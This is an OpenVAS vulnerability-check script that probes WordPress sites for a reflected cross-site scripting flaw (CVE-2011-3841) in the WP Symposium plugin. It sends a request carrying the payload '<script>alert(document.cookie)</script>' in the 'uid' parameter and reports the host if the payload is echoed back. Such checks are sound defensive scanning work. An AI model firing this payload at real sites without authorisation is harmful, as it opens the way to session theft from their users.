###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_wp_symposium_plugin_uid_param_xss_vuln.nasl 11855 2018-10-12 07:34:51Z cfischer $
#
# WordPress WP Symposium Plugin 'uid' Parameter Cross-Site Scripting Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802288");
  script_version("$Revision: 11855 $");
  script_bugtraq_id(51017);
  script_cve_id("CVE-2011-3841");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2017-04-18 11:02:14 +0200 (Di, 18 Apr 2017)$");
  script_tag(name:"creation_date", value:"2012-01-02 16:39:02 +0530 (Mon, 02 Jan 2012)");
  script_name("WordPress WP Symposium Plugin 'uid' Parameter Cross-Site Scripting Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wordpress/installed");

  script_xref(name:"URL", value:"http://secunia.com/advisories/47243");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/71748");
  script_xref(name:"URL", value:"http://secunia.com/secunia_research/2011-82/");
  script_xref(name:"URL", value:"http://www.wpsymposium.com/2011/12/v11-12-08/");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to insert arbitrary HTML
  and script code, which will be executed in a user's browser session in the
  context of an affected site.");

  script_tag(name:"affected", value:"WordPress WP Symposium Plugin version 11.11.26");

  script_tag(name:"insight", value:"The flaw is due to improper validation of user-supplied input passed
  to the 'uid' parameter in wp-content/plugins/wp-symposium/uploadify/get_
  profile_avatar.php, which allows attackers to execute arbitrary HTML and
  script code in a user's browser session in the context of an affected site.");

  script_tag(name:"solution", value:"Upgrade to Wordpress WP Symposium plugin version 11.12.08 or later.");

  script_tag(name:"summary", value:"This host is running WordPress WP Symposium plugin and is prone to
  cross site scripting vulnerability.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://wordpress.org/extend/plugins/wp-symposium");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE)) exit(0);
if(!dir = get_app_location(cpe:CPE, port:port)) exit(0);

if(dir == "/") dir = "";
url = dir + '/wp-content/plugins/wp-symposium/uploadify/get_profile_avatar.php?uid=<script>alert(document.cookie)</script>';

if(http_vuln_check(port:port, url:url, check_header:TRUE, pattern:"<script>alert\(document\.cookie\)</script>")){
  report = report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);